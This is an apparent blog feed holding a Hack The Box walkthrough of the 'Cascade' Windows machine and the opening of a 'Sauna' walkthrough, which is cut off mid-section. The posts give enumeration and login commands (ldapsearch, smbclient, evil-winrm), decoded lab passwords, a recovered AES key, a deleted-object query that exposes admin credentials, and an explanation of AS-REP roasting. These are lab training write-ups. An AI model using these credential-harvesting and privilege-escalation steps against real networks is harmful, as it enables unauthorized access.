&lt;p&gt;Happy Hacking !&lt;/p&gt;</content><author><name>Venkatraman K</name><email>kvenkatraman10@gmail.com</email></author><category term="Blogs" /><category term="VulnHub" /></entry><entry><title type="html">Cascade Machine Walkthrough</title><link href="http://localhost:4000/blogs/hackthebox/cascade.html" rel="alternate" type="text/html" title="Cascade Machine Walkthrough" /><published>2020-07-25T00:00:00+05:30</published><updated>2020-07-25T00:00:00+05:30</updated><id>http://localhost:4000/blogs/hackthebox/cascade</id><content type="html" xml:base="http://localhost:4000/blogs/hackthebox/cascade.html">&lt;p class=&quot;lead&quot;&gt;&lt;strong&gt;&lt;em&gt;“Your most unhappy customers are your greatest source of learning.&lt;/em&gt;&lt;/strong&gt;” - Bill Gates&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/cascade/machine.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;ul class=&quot;large-only&quot; id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#machine-matrix&quot; id=&quot;markdown-toc-machine-matrix&quot;&gt;Machine Matrix&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#machine-summary&quot; id=&quot;markdown-toc-machine-summary&quot;&gt;Machine Summary&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#nmap-scan&quot; id=&quot;markdown-toc-nmap-scan&quot;&gt;Nmap Scan&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#enumeration-on-port-139-and-445&quot; id=&quot;markdown-toc-enumeration-on-port-139-and-445&quot;&gt;Enumeration on port 139 and 445&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#enumerating-using-ldap-queries&quot; id=&quot;markdown-toc-enumerating-using-ldap-queries&quot;&gt;Enumerating Using LDAP Queries&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#enumerating-shares-with-rthompson-credentials&quot; id=&quot;markdown-toc-enumerating-shares-with-rthompson-credentials&quot;&gt;Enumerating Shares with r.thompson credentials&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#acquiring-user-shell---ssmith&quot; id=&quot;markdown-toc-acquiring-user-shell---ssmith&quot;&gt;Acquiring User Shell - s.smith&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#privilege-escalation&quot; id=&quot;markdown-toc-privilege-escalation&quot;&gt;Privilege Escalation&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#disassembling-cascauditexe-and-casccryptodll&quot; id=&quot;markdown-toc-disassembling-cascauditexe-and-casccryptodll&quot;&gt;Disassembling CascAudit.exe and CascCrypto.dll&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#acquiring-administrator-access&quot; id=&quot;markdown-toc-acquiring-administrator-access&quot;&gt;Acquiring Administrator Access&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;machine-matrix&quot;&gt;Machine Matrix&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/cascade/matrix.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;machine-summary&quot;&gt;Machine Summary&lt;/h2&gt;
&lt;p&gt;Box is a windows machine that has Active Directory services running. Starting with, for a user account enocded password is stored in one of the account’s attributes which is retrived using ldap search. Upon enumerating the shares with the obtained credentials, VNC.reg file is witnessed from which we can crack the password for the user s.smith. Now for privilege escalation, again enumerating on shares with s.smith credentials gives us access to Audit.db that has custom encrypted password. We use the DnSpy to witness the encryption mechanisim. After decryption, we have credentials for account ArkSvc ( Service Account). We then use this account to recover a deleted account TempAdmin. Administrator’s password is same as TempAdmin.&lt;/p&gt;

&lt;h2 id=&quot;nmap-scan&quot;&gt;Nmap Scan&lt;/h2&gt;
&lt;p&gt;I started the enumeration with nmap scan&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; 10.10.10.182
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/cascade/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The Box has 13 ports open&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Port&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Service&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;53&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;domain&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;88&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;kerberos-sec&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;135&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;msrpc&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;139&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;netbios-ssn&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;389&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;ldap&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;445&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;microsoft-ds&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;636&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;tcpwrapped&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;3268&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;ldap&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;3269&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;tcpwrapped&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;49154&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;msrpc&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;49155&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;msrpc&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;49157&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;ncacn_http&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;49158&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;msrpc&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;enumeration-on-port-139-and-445&quot;&gt;Enumeration on port 139 and 445&lt;/h2&gt;
&lt;p&gt;I used smbclient to check whether anonymous login is allowed in the machine but it was unsuccessfull. I ran enum4linux to enumerate more&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;enum4linux 10.10.10.182
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/cascade/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Usernames&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;CascGuest
arksvc
s.smith
r.thompson
util
j.wakefield
s.hickson
j.goodhand
a.turnbull
e.crowe
b.hanson
d.burman
BackupSvc
j.allen
i.croft
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;I checked whether any of these users have kerberos pre-authentication disabled, that would lead us to inital foothold but that didn’t workout.&lt;/p&gt;

&lt;h2 id=&quot;enumerating-using-ldap-queries&quot;&gt;Enumerating Using LDAP Queries&lt;/h2&gt;
&lt;p&gt;I started to enumerate the Active Directory using LDAP Queries&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ldapsearch &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;dc=cascade,dc=local&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; ldap://10.10.10.182
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;This gave a huge amount of result so i copied this result to a text file inorder to manually enumerate on it. This gave me a lead, I got a base64 encoded password in the object &lt;strong&gt;cascadeLegacyPwd&lt;/strong&gt; of ryan thompson user (r.thompson)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/cascade/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Encoded password: clk0bjVldmE=
Decoded password: rY4n5eva
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;I tried to login on winrm using evilwinrm for obtained credentials but didn’t work.&lt;/p&gt;

&lt;h2 id=&quot;enumerating-shares-with-rthompson-credentials&quot;&gt;Enumerating Shares with r.thompson credentials&lt;/h2&gt;
&lt;p&gt;Now i tried to enumerate on the shares with the obtained credentials of r.thompson. Thompson had access to certain shared folders.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbclient //10.10.10.182/ &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; r.thompson
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/cascade/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I enumerated on each folders, upon enumeration i got &lt;strong&gt;VNC Install.reg&lt;/strong&gt; file from \IT\Temp\s.smith\ Directory.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/cascade/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;acquiring-user-shell---ssmith&quot;&gt;Acquiring User Shell - s.smith&lt;/h2&gt;
&lt;p&gt;I downloaded the file and started looking in to it. As it is an registry file, it had object which has the password in encoded form.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/cascade/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I thought it was in hex format but it wasn’t. Upon researching a bit, i got a tool for drypting the encoded password in VNC registry file. [vncpwd]https://aluigi.altervista.org/pwdrec/vncpwd.zip). I used this tool to decrypt the password&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/cascade/7.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;username: s.smith
password: sT333ve2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;I used to evil-winrm to get the shell&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;evil-winrm &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; s.smith &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; sT333ve2 &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 10.10.10.182
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/cascade/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h2&gt;
&lt;p&gt;Again i went to enumerate on shares with s.smith credentials,&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbclient //10.10.10.182/Audit&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; s.smith
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/cascade/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;There is a file called Audit.db, that may be our way for privilege escalation. I simply checked the contents on the file using strings command&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;strings Audit.db
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/cascade/10.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I found an hash which must be the password. I tried to decrypt the hash using john and hashcat but that didn’t work. I concluded that it must be a custom encrypted password.&lt;/p&gt;

&lt;h2 id=&quot;disassembling-cascauditexe-and-casccryptodll&quot;&gt;Disassembling CascAudit.exe and CascCrypto.dll&lt;/h2&gt;
&lt;p&gt;On shares enumerating, we found an exec and a dll file CascAudit.exe and CascCrypto.dll. These files are used for encryption, hence these must be disassembled to find the encryption technique and decrypting it.&lt;/p&gt;

&lt;p&gt;I imported CascAudit.exe and CascCrypto.dll on DnSpy. I noticed that the encryption technique used is AES 128 bit with CBC mode. I got the Secret Key (c4scadek3y654321) and IV Optional Key (1tdyjCbY1Ix49842)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/cascade/11.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/cascade/12.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I used the online AES decrypter to decrypt the password through providing the keys and the encrypted password.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/cascade/13.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;username: arksvc
password: w3lc0meFr31nd
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Upon enumeration of shares using the s.smith credentials, i got an log file (ArkAdRecycleBin.log) and a html file (Meeting_Notes_June_2018.html)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/cascade/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I downloaded these files and started to enumerate on it.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/cascade/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;acquiring-administrator-access&quot;&gt;Acquiring Administrator Access&lt;/h2&gt;
&lt;p&gt;According to the log file TempAdmin User was deleted by ArkSvc user. Reading the Meeting_Notes_June_2018.html describes that the password for TempAdmin and Administrator are same.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/cascade/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So now if we are able to recover the TempAdmin password from the user who deleted TempAdmin (ArkSvc), we can have the administrator shell. I researched google on how to recover deleted accounts. I found a blog on how to recover the deleted accounts using powershell&lt;/p&gt;
&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;Get-ADObject&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-filter&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'isdeleted -eq $true -and name -ne &quot;Deleted Objects&quot;'&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-includeDeletedObjects&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-property&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;I ran this command in the shell of ArkSvc user&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/cascade/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As expected we have an password encoded in base64 on the parameter cascadeLegacyPwd. I decoded it.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;username: TempAdmin, Administrator
password: baCT3r1aN00dles
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I got the administrator shell using evil-winrm with these credentials&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/cascade/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/cascade/pwned.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Happy Hacking !&lt;/p&gt;</content><author><name>Venkatraman K</name><email>kvenkatraman10@gmail.com</email></author><category term="Blogs" /><category term="Hackthebox" /><summary type="html">“Your most unhappy customers are your greatest source of learning.” - Bill Gates</summary></entry><entry><title type="html">Sauna Machine Walkthrough</title><link href="http://localhost:4000/blogs/hackthebox/sauna.html" rel="alternate" type="text/html" title="Sauna Machine Walkthrough" /><published>2020-07-18T00:00:00+05:30</published><updated>2020-07-18T00:00:00+05:30</updated><id>http://localhost:4000/blogs/hackthebox/sauna</id><content type="html" xml:base="http://localhost:4000/blogs/hackthebox/sauna.html">&lt;p class=&quot;lead&quot;&gt;&lt;strong&gt;&lt;em&gt;“Technology is just a tool. In terms of getting the kids working together and motivating them, the teacher is the most important.”&lt;/em&gt;&lt;/strong&gt;   - Bill Gates&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/sauna/poster.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;ul class=&quot;large-only&quot; id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#machine-matrix&quot; id=&quot;markdown-toc-machine-matrix&quot;&gt;Machine Matrix&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#machine-summary&quot; id=&quot;markdown-toc-machine-summary&quot;&gt;Machine Summary&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#nmap-scan&quot; id=&quot;markdown-toc-nmap-scan&quot;&gt;Nmap Scan&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#enumeration-on-port-80&quot; id=&quot;markdown-toc-enumeration-on-port-80&quot;&gt;Enumeration on port 80&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#enumerating-with-usernames&quot; id=&quot;markdown-toc-enumerating-with-usernames&quot;&gt;Enumerating with usernames&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#kerberos-pre-authentication&quot; id=&quot;markdown-toc-kerberos-pre-authentication&quot;&gt;Kerberos Pre-Authentication&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#acquring-user-shell&quot; id=&quot;markdown-toc-acquring-user-shell&quot;&gt;Acquring User Shell&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#privilege-escalation&quot; id=&quot;markdown-toc-privilege-escalation&quot;&gt;Privilege Escalation&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;machine-matrix&quot;&gt;Machine Matrix&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/sauna/machinematrix.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;machine-summary&quot;&gt;Machine Summary&lt;/h2&gt;
&lt;p&gt;Box has an webapplication running, from which we enumerated the usernames. We made certain modifications on the usernames and ran GetNPUsers.py from impacket library inorder to check whether any user has kerberos pre-authentication disabled. As expected one (fsmith) user as kerberos pre-authentication disabled and using winrm we get the user shell. Now for privilege escalation, we find that there is a default crendentials stored for a user (svs_loanmgr) but that that is not the administrator. We use secretsdump.py again from impacket library to dump the crendentials of all the user including the administrator.&lt;/p&gt;

&lt;h2 id=&quot;nmap-scan&quot;&gt;Nmap Scan&lt;/h2&gt;
&lt;p&gt;I started the enumeration with nmap scan&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; 10.10.10.10.175
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/sauna/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The Box had 12 ports open&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Port&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Service&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;53&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;domain&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;80&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;http IIS Server&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;88&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;kerberos-sec&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;135&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;msrpc&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;139&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;netbios-ssn&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;389&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;ldap&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;445&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;microsoft-ds&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;464&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;kpasswd5&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;593&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;ncacan_http&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;636&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;tcpwrapped&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;3268&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;ldap&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;3269&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;tcpwrapped&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;enumeration-on-port-80&quot;&gt;Enumeration on port 80&lt;/h2&gt;
&lt;p&gt;I enumerated on the webapplication to check if there is any misconfigurations that could lead us to initial foothold but that didnt end well. We have potential names of the employees and check with any of the user have kerberos pre-authentication disabled.&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;fergus smith
shaun coins
sophie driver
bowie taylor
hugo bear
steven kerb
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/sauna/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;enumerating-with-usernames&quot;&gt;Enumerating with usernames&lt;/h2&gt;

&lt;p&gt;I formed a list of usernames of the  Active Directory, i formed the list using certain naming conventions such as username for John Melon can be&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;j.melon 
jmelon
johnm
john.melon
john.m
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/sauna/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;kerberos-pre-authentication&quot;&gt;Kerberos Pre-Authentication&lt;/h2&gt;
&lt;p&gt;The Key Distribution Center (KDC) is available as part of the domain controller and performs two key functions which are: Authentication Service (AS) and Ticket-Granting Service (TGS)&lt;/p&gt;

&lt;p&gt;By default the KDC requires all accounts to use pre-authentication. This is a security feature which offers protection against password-guessing attacks. The AS request identifies the client to the KDC in plain text. If pre-authentication is enabled, a time stamp will be encrypted using the user’s password hash as an encryption key. If the KDC reads a valid time when using the user’s password hash, which is available in the Active Directory, to decrypt the time stamp, the KDC knows that request isn’t a replay of a previous request.&lt;/p&gt;

&lt;p&gt;When you do not enforce pre-authentication, a malicious attacker can directly send a dummy request for authentication. The KDC will return an encrypted TGT and the attacker can brute force it offline.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/sauna/kerberos_preauthentication.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;acquring-user-shell&quot;&gt;Acquring User Shell&lt;/h2&gt;
&lt;p&gt;Some time kerberos pre-authentication is disabled for the domain users. As mentioned earlier we can get the encrypted TGT with a dumy query using GetNPUsers.py from impacket library with the username list that i have formed.&lt;/p&gt;
